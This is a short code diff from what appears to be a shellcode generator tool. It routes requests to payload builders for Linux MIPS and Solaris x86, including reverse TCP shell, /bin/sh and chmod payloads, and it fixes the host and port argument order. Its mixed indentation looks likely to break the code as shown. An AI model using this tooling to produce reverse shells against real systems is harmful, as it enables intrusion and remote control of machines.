@@ -231,7 +231,8 @@ def generator( choose, shellcode, argv="None", argv2="None"):
 		elif shellcode == "bin_sh":
 			from LinuxMIPS.bin_sh import bin_sh
 			return bin_sh()
-		elif shellcode == "chmod": 	
+		
+                elif shellcode == "chmod": 	
 			from LinuxMIPS.chmod import chmod
 			from stackconvert import plaintext
 			return chmod( plaintext(argv))
@@ -273,16 +274,20 @@ def generator( choose, shellcode, argv="None", argv2="None"):
                         return PayloadModule( argv, argv2).gen_shellcode()
 
 
-                elif choose == "solarisx86":	
+        elif choose == "solarisx86":	
                         if shellcode == "read":
                                 from Solarisx86.read import read
-                                from plaintext import plaintext
+                                from stackconvert import plaintext
                                 return read( plaintext(argv))	
                         elif shellcode == "reverse_tcp":
                                 from Solarisx86.reverse_tcp import reverse_tcp
                                 from stackconvert import IP
                                 from stackconvert import PORT
-                                return reverse_tcp( IP(argv2), PORT(argv))
+				#return reverse_tcp(host=IP(argv), port=PORT(argv2))
+                                dombili = IP(argv)
+                                kocakari = PORT(argv2)
+                                return reverse_tcp(host=dombili, port=kocakari)
+                                                           
                         elif shellcode == "bin_sh":
                                 from Solarisx86.bin_sh import bin_sh
                                 return bin_sh()
